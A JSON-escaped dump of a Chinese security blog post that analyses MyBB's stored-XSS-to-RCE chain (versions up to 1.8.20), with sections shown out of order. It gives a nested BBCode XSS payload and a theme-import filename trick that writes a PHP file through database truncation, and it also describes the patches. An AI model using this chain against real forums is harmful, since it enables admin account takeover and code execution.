data-lazy-src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408460538_61.png\" alt=\"61\"></a></p>\n<p><a href=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/201909040846089_62.png\"><img src= \"/img/loading.gif\" data-lazy-src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/201909040846089_62.png\" alt=\"62\"></a></p>\n<p>查询结果如上图</p>\n<p>&nbsp;</p>\n<p>最后将库中内容写入文件，文件名即为库中name字段，文件内容即为库中stylesheet字段</p>\n<p><a href=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408461176_63.png\"><img src= \"/img/loading.gif\" data-lazy-src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408461176_63.png\" alt=\"63\"></a></p>\n<p>如上图，构造的payload被写入aaaaaaaaaaaaaaaaaaaaaaaaaa.php</p>\n<p>&nbsp;</p>\n<p>打开aaaaaaaaaaaaaaaaaaaaaaaaaa.php，可见payload成功写入</p>\n<p><a href=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408461455_64.png\"><img src= \"/img/loading.gif\" data-lazy-src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408461455_64.png\" alt=\"64\"></a></p>\n<p>&nbsp;</p>\n<p>访问该文件</p>\n<p><a href=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408461889_65.png\"><img src= \"/img/loading.gif\" data-lazy-src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408461889_65.png\" alt=\"65\"></a></p>\n<p>Phpinfo执行成功</p>\n<p>&nbsp;</p>\n<p>&nbsp;</p>\n<p>&nbsp;</p>\n<h2 id=\"0x03-漏洞分析时发现的问题\"><a href=\"#0x03-漏洞分析时发现的问题\" class=\"headerlink\" title=\"0x03 漏洞分析时发现的问题\"></a><strong>0x03 漏洞分析时发现的问题</strong></h2><hr>\n<h3 id=\"1-sql-mode默认值问题\"><a href=\"#1-sql-mode默认值问题\" class=\"headerlink\" title=\"1. sql_mode默认值问题\"></a><strong>1. sql_mode默认值问题</strong></h3><p>笔者在尝试构造与复现rce漏洞时，当构造34字符长度文件名，以便通过mysql最大长度截断机制截断时，出现的如下问题：</p>\n<p><a href=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408462238_66.png\"><img src= \"/img/loading.gif\" data-lazy-src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408462238_66.png\" alt=\"66\"></a></p>\n<p>Data too long~</p>\n<p>笔者使用的是Wamp环境，在查看安装的mysql配置时，发现默认sql_mode为STRICT_ALL_TABLES，如下图：</p>\n<p><a href=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408462511_67.png\"><img src= \"/img/loading.gif\" data-lazy-src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408462511_67.png\" alt=\"67\"></a></p>\n<p>STRICT_ALL_TABLES：</p>\n<p>对所有引擎的表都启用严格模式。(STRICT_TRANS_TABLES只对支持事务的表启用严格模式)。</p>\n<p>在严格模式下，一旦任何操作的数据产生问题，都会终止当前的操作。对于启用STRICT_ALL_TABLES选项的非事务引擎来说，这时数据可能停留在一个未知的状态。这可能不是所有非事务引擎愿意看到的一种情况，因此需要非常小心这个选项可能带来的潜在影响。</p>\n<p>在严格模式下，超长的字符串，不能被截断入库，因此这里可能会影响到该漏洞的利用</p>\n<p>###</p>\n<h3 id=\"2-urldecode的必要性\"><a href=\"#2-urldecode的必要性\" class=\"headerlink\" title=\"2.urldecode的必要性\"></a>2.urldecode的必要性</h3><p>在xss漏洞中，漏洞作者原文有一段描述如下</p>\n<p> <a href=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408462865_68.png\"><img src= \"/img/loading.gif\" data-lazy-src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408462865_68.png\" alt=\"68\"></a></p>\n<p>漏洞作者在他的文章中这样描述</p>\n<p>“通常，由于正则表达式过滤器可以防止此类攻击，因此无法在其他bbcodes中注入bbcodes。但是，对于呈现[video] bbcodes的回调方法会在应嵌入的视频的URL上调用urldecode（）。视频URL被urldecoded，这将允许绕过正则表达式保护并通过URL编码注入。”</p>\n<p>从作者的描述来看，正是因为此处的urldecode存在，导致被url编码后的payload可以绕过正则防护，从而造成注入。根据作者描述，构建的流程如下：</p>\n<p>1.Payload-&gt;正则过滤器-&gt;检测不通过-&gt;失败</p>\n<p>2.url编码后的payload-&gt;正则过滤器-&gt;检测通过-&gt;urldecode-&gt;还原为明文payload-&gt;注入成功</p>\n<p>但是在我实际分析中，发现根本不需要对payload进行URL编码，正如上文我构造的pyaload，无需编码仍可触发漏洞。而且，也没有在urldecode执行前，发现正则过滤器</p>\n<h3 id=\"3-RCE漏洞的入口\"><a href=\"#3-RCE漏洞的入口\" class=\"headerlink\" title=\"3.RCE漏洞的入口\"></a>3.RCE漏洞的入口</h3><p>关于RCE漏洞的入口，作者原文描述如下:</p>\n<p> <a href=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408463197_69.png\"><img src= \"/img/loading.gif\" data-lazy-src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408463197_69.png\" alt=\"69\"></a></p>\n<p>在此处，作者多次提到create与choose the filename字眼，一度让我认为漏洞存在于创建与修改Theme处，如下图</p>\n<p> <a href=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408463671_70.png\"><img src= \"/img/loading.gif\" data-lazy-src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408463671_70.png\" alt=\"70\"></a></p>\n<p>或是修改Template Name处，如下图</p>\n<p> <a href=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408463921_71.png\"><img src= \"/img/loading.gif\" data-lazy-src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408463921_71.png\" alt=\"71\"></a></p>\n<p>在尝试寻找rce入口时，发现一处有意思的地方，当修改templates为aaaaaaaaaaaaaaaaaaaaaaaaaa.php.css时</p>\n<p> <a href=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408464218_72.png\"><img src= \"/img/loading.gif\" data-lazy-src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408464218_72.png\" alt=\"72\"></a></p>\n<p>保存后，程序会将.css截断，并提示后缀问题，如下图</p>\n<p> <a href=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408464587_73.png\"><img src= \"/img/loading.gif\" data-lazy-src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408464587_73.png\" alt=\"73\"></a></p>\n<p>在跟踪此处代码时发现，在修改template name时，程序是会检查文件名长度并截断的，控制template name长度为30字符，如下图</p>\n<p> <a href=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408464861_74.png\"><img src= \"/img/loading.gif\" data-lazy-src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408464861_74.png\" alt=\"74\"></a></p>\n<p>这里可以印证，漏洞入口并不在修改名字和创建template处，经过后来的分析与寻找，才找到上文中真正的入口点，也就是Import a Theme处。但是从这个过程可见，mybb对文件名长度还是有一定限制的，只是防护的有疏漏，忘记检查导入的xml结构中的name字段长度。</p>\n<p>&nbsp;</p>\n<h2 id=\"0x04-漏洞修复\"><a href=\"#0x04-漏洞修复\" class=\"headerlink\" title=\"0x04 漏洞修复\"></a><strong>0x04 漏洞修复</strong></h2><hr>\n<h3 id=\"xss漏洞\"><a href=\"#xss漏洞\" class=\"headerlink\" title=\"xss漏洞\"></a><strong>xss漏洞</strong></h3><p>针对xss漏洞，使用encode_url方法替换原来的htmlspecialchars_uni，如下图</p>\n<p> <a href=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408465133_75.png\"><img src= \"/img/loading.gif\" data-lazy-src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408465133_75.png\" alt=\"75\"></a></p>\n<p>回顾上文，在漏洞利用中，id中的内容为嵌套的url bbcod代码</p>\n<p> <a href=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408465356_76.png\"><img src= \"/img/loading.gif\" data-lazy-src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408465356_76.png\" alt=\"76\"></a></p>\n<p>当id被url编码后，之后在通过正则解析url bbcod代码时，该处被编码后的内容就不会被正则匹配到，从而防止嵌套解析造成xss漏洞</p>\n<h3 id=\"RCE漏洞\"><a href=\"#RCE漏洞\" class=\"headerlink\" title=\"RCE漏洞\"></a>RCE漏洞</h3><p>针对rce漏洞，使用my_substr方法限制name长度为30字符，如下图</p>\n<p> <a href=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408465669_77.png\"><img src= \"/img/loading.gif\" data-lazy-src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408465669_77.png\" alt=\"77\"></a></p>\n","site":{"data":{"link":[{"class_name":"友情鏈接","class_desc":"那些人，那些事","link_list":[{"name":"xxlegend","link":"http://xxlegend.com/","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/xxlegend.png"},{"name":"phithon","link":"https://www.leavesongs.com","avatar":"https://secure.gravatar.com/avatar/c4267eb6d17276fa31c547ac71611e90.jpg?s=100&d=mm&r=g"},{"name":"ADOG","link":"http://foreversong.cn/","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/微信图片_20200916153556.jpg"},{"name":"kylingit","link":"https://kylingit.com","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/logo.jpg"},{"name":"tsang","link":"https://jontsang.github.io","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/avatar.png"},{"name":"BlBana","link":"https://drops.blbana.cc","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/Misaka.jpg"},{"name":"ChaBug安全","link":"http://www.chabug.org","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/微信截图_20200918105651.png"}]}]}},"cover":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/威胁情报的定义及使用.jpg","excerpt":"<div align=\"center\"></div>\n\n<p>MyBB是国际上非常优秀的免费论坛软件，最大的特色是简单但是功能却出奇的强大，支持多国语言，可以分别设置前台后台的语言。</p>\n<p>MyBB作为一个开源项目，拥有活跃的社区环境，项目的管理,发展由社区志愿者支持。用户量广泛，在github上的项目拥有609 个star，79个releases。</p>\n<p>MyBB &lt;= 1.8.20存在一处从存储的XSS到RCE组合利用漏洞，攻击者可以先通过xss获得管理员权限，再通过rce达到远程代码执行。这套利用流程不仅隐蔽而且利用难度低，只要私信给mybb管理员发出一条包含payload的消息即可。</p>","more":"<p>该漏洞由RIPS 团队安全研究人员Simon Scannell发现并纰漏。但截止目前，并未公布利用poc</p>\n<p>我们试图从Simon Scannell简单的漏洞披露中深入分析该漏洞，并尝试还原出poc</p>\n<p>首先分析下mybb xss漏洞</p>\n<p>&nbsp;</p>\n<h2 id=\"0x01-XSS漏洞\"><a href=\"#0x01-XSS漏洞\" class=\"headerlink\" title=\"0x01 XSS漏洞\"></a><strong>0x01 XSS漏洞</strong></h2><hr>\n<p>此漏洞为mybb对BBCode的错误解析而造成的</p>\n<p>首先了解下BBCode:</p>\n<p>BCode是Bulletin Board Code的缩写，属于轻量标记语言（Lightweight Markup Language）的一种，如字面上所表示的，它主要是使用在BBS、论坛、Blog等网络应用上。BBcode的语法通常为 [标记] 这种形式，即语法左右用两个中括号包围，以作为与正常文字间的区别。系统解译时遇上中括号便知道该处是BBcode，会在解译结果输出到用户端时转换成最为通用的HTML语法。</p>\n<p>下图举个简单的例子：</p>\n<p><a href=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408424824_0.png\"><img src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408424824_0.png\" alt=\"0\"></a></p>\n<p>在BBcode中给关键词加链接可以用下面的代码：</p>\n<p>[url=<a href=\"https://www.xiongbenxiongbenxiong.com/1.html\">https://www.xiongbenxiongbenxiong.com/1.html</a>]熊本熊本熊[/url]</p>\n<p>然而，BBcode只是一种标记语言，并没有一个共同的标准。各个BBS、论坛、Blog等网络应用程序可能会有自己独创的BBcode。在实际场景中，不同的程序会在后台使用不同的方式将BBcode解析成html来进行页面渲染</p>\n<p>接下来看下mybb程序对BBCode的解析流程</p>\n<p>举一个例子，使用BBcode格式分别插入的一条视频链接与一条url链接</p>\n<p><a href=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408425165_1.png\"><img src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408425165_1.png\" alt=\"1\"></a></p>\n<p>Mybb程序会对BBcode进行解析，以便转化为浏览器可识别的html语言</p>\n<p>Mybb首先会对video链接进行解析（注意：这与video和url的排列顺序无关，在程序的后台，会首先处理video，后处理url）</p>\n<p>经过video解析器解析后的格式如下</p>\n<p><a href=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408425474_2.png\"><img src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408425474_2.png\" alt=\"2\"></a></p>\n<p>接着mybb对BBCode格式的url进行解析，经过url解析器解析后的格式如下</p>\n<p><a href=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408425622_3.png\"><img src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408425622_3.png\" alt=\"3\"></a></p>\n<p>此时，mybb以将BBcode语言解析成为html语言，浏览器渲染页面，显示嵌入的video与超链接中的url</p>\n<p>如果，我们将两个BBCode格式的语句进行嵌套呢？</p>\n<p>像如下图这样的形式</p>\n<p><a href=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/201909040842598_4.png\"><img src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/201909040842598_4.png\" alt=\"4\"></a></p>\n<p>按照我们的推测，会进行如下的解析：</p>\n<p>首先，解析video</p>\n<p><a href=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/20190904084302100_5.png\"><img src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/20190904084302100_5.png\" alt=\"5\"></a></p>\n<p>解析之后的格式如上图</p>\n<p>然后，解析url，也就是下图红框处的结构</p>\n<p><a href=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408430523_6.png\"><img src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408430523_6.png\" alt=\"6\"></a></p>\n<p>解析之后的结果如下图</p>\n<p><a href=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408430716_7.png\"><img src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408430716_7.png\" alt=\"7\"></a></p>\n<p><a href=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408431056_8.png\"><img src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408431056_8.png\" alt=\"8\"></a></p>\n<p>注意上图红框这里，src中的值，被href引入的双引号闭合，而onmusemove成功逃逸出来，意味着alert会在鼠标移动时，alert将会被执行</p>\n<p>事实上，以上的流程，在mybb中是否成立。正式因为上文猜测中的嵌套解析，造成了此次xss漏洞</p>\n<p>接下来跟下代码</p>\n<p>首先，我们给管理员（admin）账号发一条如下图bbcode语言的私信</p>\n<p><a href=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408431490_9.png\"><img src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408431490_9.png\" alt=\"9\"></a></p>\n<p>这条私信会原封不动的被写入数据库中</p>\n<p><a href=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408431789_10.png\"><img src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408431789_10.png\" alt=\"10\"></a></p>\n<p>当管理员查看私信时，这条message会被从数据库中取出，并解析为html语言进行渲染</p>\n<p><a href=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408432090_11.png\"><img src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408432090_11.png\" alt=\"11\"></a></p>\n<p>程序调用private.php执行上述操作，跟进private.php</p>\n<p><a href=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/201909040843246_12.png\"><img src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/201909040843246_12.png\" alt=\"12\"></a></p>\n<p>在997行处，程序将留言从数据库中取出，并赋值$pm</p>\n<p><a href=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408432858_13.png\"><img src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408432858_13.png\" alt=\"13\"></a></p>\n<p>在11789行处，将$pm传入build_postbit方法</p>\n<p><a href=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408433134_14.png\"><img src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408433134_14.png\" alt=\"14\"></a></p>\n<p>跟入build_postbit方法</p>\n<p><a href=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408433443_15.png\"><img src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408433443_15.png\" alt=\"15\"></a></p>\n<p>在该方法774行处，将message传入parse_message,这里的message即为我们构造的BBCode语句</p>\n<p>跟入parse_message方法</p>\n<p><a href=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408434148_16.png\"><img src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408434148_16.png\" alt=\"16\"></a></p>\n<p>在parse_message方法中201行处，调用parse_mycode对$message进行处理</p>\n<p>跟入parse_mycod方法</p>\n<p><a href=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408434479_17.png\"><img src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408434479_17.png\" alt=\"17\"></a></p>\n<p>如上图，第一个红框处，会对bbcode中的video结构进行解析，而第二个红框处，会对url,email等结构进行解析。正因为这里的解析的先后顺序，决定了构造poc时的嵌套顺序</p>\n<p>首先来看video解析</p>\n<p><a href=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408434815_18.png\"><img src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408434815_18.png\" alt=\"18\"></a></p>\n<p>这里使用了preg_replace_callback，对匹配到的内容使用mycode_parse_video_callback回调进行替换</p>\n<p><a href=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408435155_19.png\"><img src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408435155_19.png\" alt=\"19\"></a></p>\n<p>跟入mycode_parse_video_callback</p>\n<p><a href=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408435498_20.png\"><img src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408435498_20.png\" alt=\"20\"></a></p>\n<p>可见mycode_parse_video_callback将$matches[1], $matches[2]传入mycode_parse_video方法</p>\n<p>跟入mycode_parse_video方法</p>\n<p> <a href=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408435737_21.png\"><img src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408435737_21.png\" alt=\"21\"></a></p>\n<p>如下图，首先使用parse_url对传入的url($matches[2])进行解析</p>\n<p> <a href=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408440199_22.png\"><img src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408440199_22.png\" alt=\"22\"></a></p>\n<p>解析后的parsed_url值如下图</p>\n<p> <a href=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408440475_23.png\"><img src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408440475_23.png\" alt=\"23\"></a></p>\n<p>接着，将$parsed_url[‘fragment’]赋值与$ fragment</p>\n<p> <a href=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408440715_24.png\"><img src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408440715_24.png\" alt=\"24\"></a></p>\n<p>随后，进入switch语句，根据不同视频来源，分情况解析。我们这里构造的是youtbe来源，进入该分支</p>\n<p> <a href=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408441164_25.png\"><img src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408441164_25.png\" alt=\"25\"></a></p>\n<p>在下图中，将$ fragment中的!v=置空，赋值与$id</p>\n<p><a href=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408441466_26.png\"><img src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408441466_26.png\" alt=\"26\"></a></p>\n<p>此时id值为test[url=onmousemove=’alert(1337)’]</p>\n<p> <a href=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408441887_27.png\"><img src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408441887_27.png\" alt=\"27\"></a></p>\n<p>随后，由于担心xss攻击，程序在这里对$id进行html特殊字符转义处理，如下图</p>\n<p><a href=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408442138_28.png\"><img src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408442138_28.png\" alt=\"28\"></a></p>\n<p><a href=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408442429_29.png\"><img src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408442429_29.png\" alt=\"29\"></a></p>\n<p>接着，从templates中取出对应video的模板，如下图$templates get方法</p>\n<p><a href=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408442779_30.png\"><img src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408442779_30.png\" alt=\"30\"></a></p>\n<p>根据get方法，看下取出模板的形式</p>\n<p><a href=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/20190904084430100_31.png\"><img src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/20190904084430100_31.png\" alt=\"31\"></a></p>\n<p>上图为最终生成html的模板，此处的$id即为上文中case分支中赋值的$id</p>\n<p>最终，将$id值填充的模板中，结果如下图</p>\n<p><a href=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408443348_32.png\"><img src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408443348_32.png\" alt=\"32\"></a></p>\n<p>回到preg_replace_callback处，$message替换后的结果如下图</p>\n<p><a href=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408443628_33.png\"><img src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408443628_33.png\" alt=\"33\"></a></p>\n<p>此时$message=&lt;iframe width=”560” height=”315” src=”//<a href=\"http://www.youtube.com/embed/test[url=onmousemove=&#39;alert(1337)&#39;]&quot;\">www.youtube.com/embed/test[url=onmousemove=&#39;alert(1337)&#39;]&quot;</a> frameborder=”0” allowfullscreen&gt;&lt;/iframe&gt;[/url]</p>\n<p>Video的解析到此结束了，此时html语句，是不是和上文流程中猜测的形式一样呢？</p>\n<p>&nbsp;</p>\n<p>接下来，仍然使用preg_replace_callback对url进行替换</p>\n<p><a href=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408443948_34.png\"><img src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408443948_34.png\" alt=\"34\"></a></p>\n<p>如下图可见，使用#[url=((?!javascript)[a-z]+?://)([^</p>\n<p>“&lt;]+?)](.+?)[/url]#si正则进行匹配，使用</p>\n<p>mycode_parse_url_callback1回调对$message进行替换</p>\n<p><a href=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408444218_35.png\"><img src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408444218_35.png\" alt=\"35\"></a></p>\n<p>此处的处理与上文中的video极其相似，这里就不重复说明了</p>\n<p>在url解析结束后，messgae值如下图</p>\n<p><a href=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408444522_36.png\"><img src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408444522_36.png\" alt=\"36\"></a></p>\n<p>可见，如上文流程分析一致，href中引入的双引号，将src闭合了，onmousemove得以逃逸</p>\n<p>最终，xss产生</p>\n<p><a href=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408444935_37.png\"><img src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408444935_37.png\" alt=\"37\"></a></p>\n<p><a href=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408445217_38.png\"><img src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408445217_38.png\" alt=\"38\"></a></p>\n<p><a href=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408445522_39.png\"><img src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408445522_39.png\" alt=\"39\"></a></p>\n<p>利用给管理员私信的这个功能，通过xss漏洞，可以获取管理员cookie，从而获得后台权限</p>\n<p>接下来分析下rce漏洞</p>\n<p>&nbsp;</p>\n<h2 id=\"0x02-RCE漏洞\"><a href=\"#0x02-RCE漏洞\" class=\"headerlink\" title=\"0x02 RCE漏洞\"></a><strong>0x02 RCE漏洞</strong></h2><hr>\n<p>Mybb后台提供导入theme功能</p>\n<p><a href=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408445899_40.png\"><img src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408445899_40.png\" alt=\"40\"></a></p>\n<p>可以选择本地theme进行导入，上传的theme格式许为xml格式，形式如下</p>\n<p><a href=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408450222_41.png\"><img src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408450222_41.png\" alt=\"41\"></a></p>\n<p>这里的导入的xml文件存储了该theme下所有包含的css文件，下面展示其中两个片段</p>\n<p><a href=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408450698_42.png\"><img src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408450698_42.png\" alt=\"42\"></a></p>\n<p><a href=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408450976_43.png\"><img src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408450976_43.png\" alt=\"43\"></a></p>\n<p>简单来说，相当于是把这个theme里包含的所有css都存储到xml一个结构里</p>\n<p>在上传xml格式的theme时，程序后台会解析该xml，如下图代码</p>\n<p><a href=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408451292_44.png\"><img src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408451292_44.png\" alt=\"44\"></a></p>\n<p>随后，将解析的xml树中的内容，例如css名称，内容、id等写入数据库</p>\n<p><a href=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408451570_45.png\"><img src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408451570_45.png\" alt=\"45\"></a></p>\n<p>上图即为解析上传的xml格式的theme，将解析出的css的信息入库的操作</p>\n<p><a href=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408451874_46.png\"><img src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408451874_46.png\" alt=\"46\"></a></p>\n<p>入库后，数据库中内容如上图</p>\n<p>在解析xml内的css数据的name时，后台程序会校验css的后缀是否合法</p>\n<p><a href=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408452251_47.png\"><img src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408452251_47.png\" alt=\"47\"></a></p>\n<p>可见，程序要求xml结构中，css文件后缀应为.css。但其校验方式仅仅检测css名称后四位是否为.css</p>\n<p>当我们构造css数据时，可以使得css文件名为aaaaaaaaaaaaaaaaaaaaaaaaaa.php.css,在css文件内容处插入payload，如下图</p>\n<p><a href=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408452587_48.png\"><img src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408452587_48.png\" alt=\"48\"></a></p>\n<p>在xml解析后，$stylesheet[‘attributes’][‘name’]的值为aaaaaaaaaaaaaaaaaaaaaaaaaa.php.css，成功绕过检测</p>\n<p>当进行入库操作时，如下图代码</p>\n<p><a href=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408452876_49.png\"><img src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408452876_49.png\" 